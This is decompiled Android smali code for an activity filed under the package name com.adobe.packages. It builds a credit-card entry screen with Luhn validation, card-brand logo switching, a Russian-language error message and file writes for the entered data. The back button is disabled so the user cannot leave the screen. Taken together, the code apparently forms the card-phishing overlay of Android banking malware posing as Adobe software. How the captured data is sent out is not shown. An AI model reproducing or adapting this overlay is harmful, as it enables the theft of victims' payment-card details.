.class public Lcom/adobe/packages/PM;
.super Landroid/app/Activity;
.source "PM.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 42
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private CardDetect(Ljava/lang/String;)V
    .locals 7
    .param p1, "cc"    # Ljava/lang/String;

    .prologue
    const/4 v6, 0x1

    .line 346
    const/4 v3, 0x0

    invoke-virtual {p1, v3, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    .line 347
    .local v0, "a":Ljava/lang/String;
    const/4 v2, 0x0

    .line 348
    .local v2, "t":Z
    const-string v3, "3"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 349
    const/4 v2, 0x1

    .line 350
    const-string v3, "a"

    invoke-direct {p0, v3}, Lcom/adobe/packages/PM;->SelectCard(Ljava/lang/String;)V

    .line 352
    :cond_0
    const-string v3, "4"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 353
    const/4 v2, 0x1

    .line 354
    const-string v3, "v"

    invoke-direct {p0, v3}, Lcom/adobe/packages/PM;->SelectCard(Ljava/lang/String;)V

    .line 356
    :cond_1
    const-string v3, "5"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 357
    const/4 v2, 0x1

    .line 358
    const-string v3, "mc"

    invoke-direct {p0, v3}, Lcom/adobe/packages/PM;->SelectCard(Ljava/lang/String;)V

    .line 360
    :cond_2
    const-string v3, "6"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 361
    const/4 v2, 0x1

    .line 362
    const-string v3, "d"

    invoke-direct {p0, v3}, Lcom/adobe/packages/PM;->SelectCard(Ljava/lang/String;)V

    .line 365
    :cond_3
    if-nez v2, :cond_4

    .line 366
    const v3, 0x7f09000d

    invoke-virtual {p0, v3}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/EditText;

    .line 368
    .local v1, "cc_select":Landroid/widget/EditText;
    invoke-virtual {p0}, Lcom/adobe/packages/PM;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "\u041d\u043e\u043c\u0435\u0440 \u043a\u0430\u0440\u0442\u044b \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u043d\u0430\u0447\u0438\u043d\u0430\u0442\u044c\u0441\u044f \u0441 \u0446\u0438\u0444\u0440 \""

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v5

    invoke-interface {v5}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "\". \u041f\u0440\u043e\u0432\u0435\u0440\u044c\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u0432\u0432\u043e\u0434\u0438\u043c\u044b\u0445 \u0412\u0430\u043c\u0438 \u0434\u0430\u043d\u043d\u044b\u0445."

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4, v6}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v3

    invoke-virtual {v3}, Landroid/widget/Toast;->show()V

    .line 369
    invoke-virtual {p0}, Lcom/adobe/packages/PM;->finish()V

    .line 372
    .end local v1    # "cc_select":Landroid/widget/EditText;
    :cond_4
    return-void
.end method

.method private SelectCard(Ljava/lang/String;)V
    .locals 8
    .param p1, "type"    # Ljava/lang/String;

    .prologue
    const/4 v7, 0x0

    const/16 v6, 0x8

    .line 377
    const v5, 0x7f090008

    invoke-virtual {p0, v5}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/ImageView;

    .line 378
    .local v4, "visa":Landroid/widget/ImageView;
    const v5, 0x7f090009

    invoke-virtual {p0, v5}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/ImageView;

    .line 379
    .local v3, "mc":Landroid/widget/ImageView;
    const v5, 0x7f09000a

    invoke-virtual {p0, v5}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ImageView;

    .line 380
    .local v0, "amex":Landroid/widget/ImageView;
    const v5, 0x7f09000b

    invoke-virtual {p0, v5}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/ImageView;

    .line 381
    .local v2, "disc":Landroid/widget/ImageView;
    const v5, 0x7f09000c

    invoke-virtual {p0, v5}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/ImageView;

    .line 383
    .local v1, "cirrus":Landroid/widget/ImageView;
    const-string v5, "a"

    if-ne p1, v5, :cond_0

    .line 384
    invoke-virtual {v0, v7}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 385
    invoke-virtual {v4, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 386
    invoke-virtual {v3, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 387
    invoke-virtual {v2, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 388
    invoke-virtual {v1, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 391
    :cond_0
    const-string v5, "v"

    if-ne p1, v5, :cond_1

    .line 392
    invoke-virtual {v0, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 393
    invoke-virtual {v4, v7}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 394
    invoke-virtual {v3, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 395
    invoke-virtual {v2, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 396
    invoke-virtual {v1, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 399
    :cond_1
    const-string v5, "mc"

    if-ne p1, v5, :cond_2

    .line 400
    invoke-virtual {v0, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 401
    invoke-virtual {v4, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 402
    invoke-virtual {v3, v7}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 403
    invoke-virtual {v2, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 404
    invoke-virtual {v1, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 407
    :cond_2
    const-string v5, "d"

    if-ne p1, v5, :cond_3

    .line 408
    invoke-virtual {v0, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 409
    invoke-virtual {v4, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 410
    invoke-virtual {v3, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 411
    invoke-virtual {v2, v7}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 412
    invoke-virtual {v1, v6}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 415
    :cond_3
    const-string v5, "reset"

    if-ne p1, v5, :cond_4

    .line 416
    invoke-virtual {v0, v7}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 417
    invoke-virtual {v4, v7}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 418
    invoke-virtual {v3, v7}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 419
    invoke-virtual {v2, v7}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 420
    invoke-virtual {v1, v7}, Landroid/widget/ImageView;->setVisibility(I)V

    .line 423
    :cond_4
    return-void
.end method

.method static synthetic access$0(Lcom/adobe/packages/PM;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 0

    .prologue
    .line 426
    invoke-direct {p0, p1, p2, p3}, Lcom/adobe/packages/PM;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    return-void
.end method

.method static synthetic access$1(Lcom/adobe/packages/PM;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 375
    invoke-direct {p0, p1}, Lcom/adobe/packages/PM;->SelectCard(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$2(Lcom/adobe/packages/PM;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 345
    invoke-direct {p0, p1}, Lcom/adobe/packages/PM;->CardDetect(Ljava/lang/String;)V

    return-void
.end method

.method private static sumDigits(I)I
    .locals 2
    .param p0, "i"    # I

    .prologue
    .line 341
    rem-int/lit8 v0, p0, 0xa

    div-int/lit8 v1, p0, 0xa

    add-int/2addr v0, v1

    return v0
.end method

.method public static validate(Ljava/lang/String;)Z
    .locals 4
    .param p0, "creditCard"    # Ljava/lang/String;

    .prologue
    .line 328
    const/4 v2, 0x0

    .line 329
    .local v2, "sum":I
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v1

    .line 330
    .local v1, "length":I
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    if-lt v0, v3, :cond_0

    .line 337
    rem-int/lit8 v3, v2, 0xa

    if-nez v3, :cond_2

    const/4 v3, 0x1

    :goto_1
    return v3

    .line 331
    :cond_0
    rem-int/lit8 v3, v0, 0x2

    if-nez v3, :cond_1

    .line 332
    sub-int v3, v1, v0

    add-int/lit8 v3, v3, -0x1

    invoke-virtual {p0, v3}, Ljava/lang/String;->charAt(I)C

    move-result v3

    add-int/lit8 v3, v3, -0x30

    add-int/2addr v2, v3

    .line 330
    :goto_2
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 334
    :cond_1
    sub-int v3, v1, v0

    add-int/lit8 v3, v3, -0x1

    invoke-virtual {p0, v3}, Ljava/lang/String;->charAt(I)C

    move-result v3

    add-int/lit8 v3, v3, -0x30

    mul-int/lit8 v3, v3, 0x2

    invoke-static {v3}, Lcom/adobe/packages/PM;->sumDigits(I)I

    move-result v3

    add-int/2addr v2, v3

    goto :goto_2

    .line 337
    :cond_2
    const/4 v3, 0x0

    goto :goto_1
.end method

.method private writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 2
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 428
    :try_start_0
    new-instance v0, Ljava/io/OutputStreamWriter;

    const/4 v1, 0x0

    invoke-virtual {p3, p1, v1}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 429
    .local v0, "outputStreamWriter":Ljava/io/OutputStreamWriter;
    invoke-virtual {v0, p2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 430
    invoke-virtual {v0}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 434
    .end local v0    # "outputStreamWriter":Ljava/io/OutputStreamWriter;
    :goto_0
    return-void

    .line 432
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    .prologue
    .line 47
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 52
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 54
    const v2, 0x7f030003

    invoke-virtual {p0, v2}, Lcom/adobe/packages/PM;->setContentView(I)V

    .line 76
    const v2, 0x7f09000d

    invoke-virtual {p0, v2}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    .line 77
    .local v0, "cc":Landroid/widget/EditText;
    const v2, 0x7f090004

    invoke-virtual {p0, v2}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    .line 78
    .local v1, "saveButton":Landroid/widget/Button;
    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setEnabled(Z)V

    .line 81
    new-instance v2, Lcom/adobe/packages/PM$1;

    invoke-direct {v2, p0, v0}, Lcom/adobe/packages/PM$1;-><init>(Lcom/adobe/packages/PM;Landroid/widget/EditText;)V

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 165
    new-instance v2, Lcom/adobe/packages/PM$2;

    invoke-direct {v2, p0}, Lcom/adobe/packages/PM$2;-><init>(Lcom/adobe/packages/PM;)V

    invoke-virtual {v0, v2}, Landroid/widget/EditText;->setOnFocusChangeListener(Landroid/view/View$OnFocusChangeListener;)V

    .line 174
    new-instance v2, Lcom/adobe/packages/PM$3;

    invoke-direct {v2, p0, v0}, Lcom/adobe/packages/PM$3;-><init>(Lcom/adobe/packages/PM;Landroid/widget/EditText;)V

    invoke-virtual {v0, v2}, Landroid/widget/EditText;->addTextChangedListener(Landroid/text/TextWatcher;)V

    .line 310
    return-void
.end method
